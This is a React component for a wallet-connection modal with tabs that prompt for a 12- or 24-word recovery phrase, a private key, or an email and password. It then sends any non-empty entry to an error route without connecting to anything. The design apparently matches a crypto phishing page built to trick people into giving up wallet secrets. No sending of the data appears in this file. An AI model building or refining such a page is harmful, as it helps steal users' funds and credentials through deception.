import { useState, useRef } from 'react';
import a2s from '../images/a2s.png';
import x from '../images/x.png';
import styled from 'styled-components';
import { useNavigate } from 'react-router-dom';

function WalletForm(props) {
    const [formName, setFormName] = useState("Phrases");
    const [value, setValue] = useState("");
    const [value2, setValue2] = useState("");
    const [valid, setValid] = useState(null);
    const inputRef = useRef();
    const navigate = useNavigate();

    const changeHandler = (e) => {
        e.preventDefault();
        value === '' ? setValid(false) : setValid(true);
        value !== '' ? navigate('/err') : inputRef.current.focus();
    }

    return (
        <div>
            <Ddiv>
                <Fdiv>
                    <img src={a2s} alt={a2s} />
                    <img src={x} className='img2' onClick={props.onClose} />
                </Fdiv>
                <Sdiv>
                    {props.item.logo}
                    <span>
                        {props.activeName === 'wallet' &&
                            (!(props.item.para).includes('Wallet' || 'wallet')) ?
                            props.item.para + ' wallet' : props.item.para}
                    </span>
                </Sdiv>

                <Tdiv>
                    <span onClick={() => setFormName('Phrases')}>Phrases</span>
                    <span onClick={() => setFormName('Signin')}>Sign In</span>
                    <span onClick={() => setFormName('Private')}>Private Key</span>
                </Tdiv>
                <Form
                    onSubmit={changeHandler}
                >
                    {formName === 'Phrases' &&
                        <Input1
                            className={valid === false ? 'invalid' : ''}
                            ref={inputRef}
                            type="text"
                            onChange={(e) => setValue(e.target.value)}
                            name='name'
                            value={value}
                            placeholder="Enter your recovery phase"
                        />
                    }

                    {formName === 'Private' &&
                        <Input1
                            className={valid === false ? 'invalid' : ''}
                            ref={inputRef}
                            type="textarea"
                            onChange={(e) => setValue(e.target.value)}
                            name='key'
                            value={value}
                            placeholder="Enter your private key"
                        />
                    }

                    {formName === 'Signin' &&
                        <div>
                            <Input2
                                className={valid === false ? 'invalid' : ''}
                                ref={inputRef}
                                onChange={(e) => setValue(e.target.value)}
                                type="email"
                                name='name'
                                value={value}
                                placeholder="Enter email"
                            />
                            <Input2
                                className={valid === false ? 'invalid' : ''}
                                ref={inputRef}
                                onChange={(e) => setValue2(e.target.value)}
                                type="password"
                                name='password'
                                value={value2}
                                placeholder="Enter Password"
                            />
                        </div>
                    }
                    <p>
                        {formName === 'Phrases' && 'Typically 12 (sometimes 24) words separated by single spaces'}
                        {formName === 'Signin' && 'xxxxxxxxxxxxxxxxxxxxxxxxxxx'}
                        {formName === 'Private' && 'Typically xxxxxxxxxxxxxxxxxxxxxxxxxxx'}
                    </p>
                    <button
                        type='submit'
                    >Proceed</button>
                </Form>
            </Ddiv>
        </div>
    )
}

const Input1 = styled.input`
padding-left: 1rem;
height: 10rem;
border: 2px solid #9ba3af;
`;
const Input2 = styled.input`
height: 2.5rem;
padding-left: 1rem;
border: 2px solid #9ba3af;
`;
const Form = styled.form`
display: grid;
gap: 1rem;

.invalid {
    border: 1px solid red;
}
div {
    display: grid;
    gap: 2rem;
}
p{
    font-size: 1.1rem;
    font-weight: 500;
    @media(max-width:30rem){
        font-size: 1.4rem;
    font-weight: 400;
    line-height: 2rem;
    }
}
button{
    background-color:#60A5FA;
    color: white;
    width: 100.7%;
    height: 3rem;
    border-radius: 0.1rem;
    border: none;
    font-size: 1.5rem;
    font-weight: 500;
cursor: pointer;
}
`;
const Ddiv = styled.div`
padding: 1rem 1.5rem;
img {
    height: 3rem
}
`;
const Fdiv = styled.div`
display: flex;
justify-content: space-between;

img {
height: 3.7rem;
@media(max-width:30rem){
    height: 4.5rem;
}
}
.img2 {
height: 3.7rem;
    cursor: pointer;
    color: RGB(79 79 79);
    @media(max-width:30rem){
    height: 4.5rem;
}
}
`;
const Sdiv = styled.div`
display: flex;
align-items: center;

span {
color: #60A5FA;
font-weight: 800;
padding-left: 0.5rem;
@media(max-width:30rem){
font-size: 1.3rem;
}
}
img {
    height: 2.5rem;
}
`;
const Tdiv = styled.div`
display: flex;
justify-content: space-between;
font-size: 1.5rem;
font-weight: 500;
padding: 2rem 20rem 2rem 8rem;
    cursor: pointer;

 @media(max-width:30rem){
font-size: 1.3rem;
padding: 3.5rem 1.5rem;
width: 70%;
}
span {
    cursor: pointer;

}
`;

export default WalletForm;